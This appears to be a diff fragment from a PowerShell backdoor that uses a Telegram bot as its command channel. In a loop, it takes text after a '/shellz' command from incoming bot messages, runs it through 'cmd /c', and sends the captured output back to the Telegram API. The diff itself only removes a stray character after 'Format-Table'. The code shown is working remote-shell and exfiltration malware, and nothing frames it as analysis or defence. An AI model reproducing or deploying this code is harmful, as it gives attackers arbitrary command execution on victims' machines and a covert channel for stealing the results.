@@ -32,7 +32,7 @@ while($true) {
                                     {
                                               $comex =  ([regex]'/shellz').split($json.result.message.text)
                                               [array]$result = cmd /c ($comex[1]+" 2>&1");
-                                              $result | Format-Tableù
+                                              $result | Format-Table
                                               $encodedMessage = [System.Web.HttpUtility]::UrlEncode($result)
                                               $url = "https://api.telegram.org/bot$botkey/sendMessage?chat_id="+ 'chat_id' + "&text=$encodedMessage"
                                               Invoke-WebRequest -Uri $url                              
